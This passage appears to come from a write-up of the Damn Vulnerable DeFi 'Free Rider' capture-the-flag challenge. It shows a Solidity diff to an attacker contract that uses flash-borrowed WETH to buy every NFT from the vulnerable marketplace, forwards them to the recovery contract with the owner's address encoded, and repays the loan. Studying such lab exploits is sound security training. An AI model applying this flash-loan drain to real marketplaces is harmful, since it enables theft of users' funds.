@@ -76,9 +76,14 @@
         mktplace.buyMany{value: wethAmount}(tokens);
         nft = DamnValuableNFT(mktplace.token());
 
-        //send all nfts to reward contract
+        //send all nfts to reward contract, with data of who to send eth
         for (uint i = 0; i < tokenCount; i++) {
-            nft.safeTransferFrom(address(this), recoveryContract, tokens[i]);
+            nft.safeTransferFrom(
+                address(this),
+                recoveryContract,
+                tokens[i],
+                abi.encode(owner)
+            );
         }
 
         // approx 0.3% fee, +1 to round up
@@ -90,10 +95,8 @@
 
         // Repay
         weth.transfer(address(pair), amountToRepay);
-
-        //send all remaining eth to player
-        SafeTransferLib.safeTransferETH(owner, address(this).balance);
     }
+
 ```
 
 #### have a `receive()` function to enable reward ether.
